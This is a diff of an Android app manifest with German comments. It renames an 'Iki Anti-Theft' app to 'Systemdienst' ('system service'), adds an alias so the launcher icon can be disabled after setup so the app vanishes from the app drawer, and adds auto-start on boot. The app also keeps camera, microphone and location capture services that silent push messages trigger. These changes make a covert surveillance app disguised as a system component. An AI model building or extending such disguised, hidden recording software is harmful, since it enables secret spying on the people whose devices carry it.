@@ -13,29 +13,59 @@
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
 
-    <!-- Foreground Service (Android 9+ Pflicht für Kamera/Mikro im Hintergrund) -->
+    <!-- Foreground Service -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
+    <!-- Auto-Start nach Neustart -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
     <application
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
-        android:label="Iki Anti-Theft"
+        android:label="Systemdienst"
         android:theme="@style/Theme.AppCompat">
 
+        <!--
+            MainActivity läuft nur einmalig beim Setup (Permissions + FCM-Token).
+            Danach wird die Launcher-Activity per PackageManager deaktiviert
+            → App verschwindet aus der App-Schublade.
+            Der alias "LauncherAlias" ist das eigentliche Launcher-Icon;
+            MainActivity selbst hat keinen Launcher-IntentFilter.
+        -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
+            android:exported="false"
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
+
+        <!-- Separater Alias für das Launcher-Icon, damit er gezielt
+             deaktiviert werden kann, ohne die Activity zu killen -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".MainActivity"
+            android:exported="true"
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
-        <!-- Empfängt stille FCM-Trigger-Nachrichten -->
+        <!-- Startet den FCM-Token-Refresh nach Geräteneustart -->
+        <receiver
+            android:name=".receiver.BootReceiver"
+            android:exported="true"
+            android:enabled="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- FCM -->
         <service
             android:name=".service.FcmTriggerService"
             android:exported="false">
@@ -44,7 +74,7 @@
             </intent-filter>
         </service>
 
-        <!-- Foreground Service, der die eigentliche Capture-Arbeit macht -->
+        <!-- Capture-Service -->
         <service
             android:name=".service.CaptureForegroundService"
             android:exported="false"
